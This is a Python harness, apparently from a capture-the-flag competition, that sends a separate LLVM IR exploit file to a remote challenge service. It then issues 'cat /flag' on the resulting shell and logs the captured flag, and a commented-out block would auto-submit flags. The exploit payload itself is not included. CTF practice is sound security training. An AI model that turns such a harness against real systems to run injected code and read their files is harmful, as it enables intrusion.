#!/usr/bin/python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Remote: ./exp.py remote ./pwn ip:port

import sys
sys.path.append('/root')
from pwncli import *
from xinan_secret import *
cli_script()
io: tube = gift.io
process_token()
i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m%s\033[0m' % (s))

def success():
    ru(b"flag{")
    flag = (b"flag{" + ru(b"\n", drop=True)).decode()
    assert ("{" in flag) and ("}" in flag)
    chal_id = 73
    #  res = post_flag(flag, chal_id)
    #  if res:
    #      if res == -1:
    #          lg("[WRONG] : " + flag)
    #          exit()
    #      elif res == -2:
    #          import time
    #          time.sleep(10)
    #          post_flag(flag, chal_id)
    lg(flag)
    import json
    try:
        with open("./flags.txt", "r") as fd:
            all_flags = json.loads(fd.read())
            for i in all_flags:
                if i['chal_port'] == io.rport:
                    if i['flag'] == flag:
                        exit()
                    else:
                        lg("[Different flag: ]" + i['flag'])
    except Exception:
        all_flags = []
    with open("./flags.txt", "w") as fd:
        chal_data = {"chal_port": io.rport, "flag": flag}
        all_flags.append(chal_data)
        fd.write(json.dumps(all_flags, sort_keys=True, indent=4, separators=(',', ': ')))
        fd.write("\n")

with open("./demo.ll", "r") as fd_exp:
    ru(b'with <EOF> :')
    code = fd_exp.read()
    sl(code.encode())
    sl("<EOF>")
    ru(b"\n")

ru(b"\n")
sl("cat /flag")
#  ia()
success()
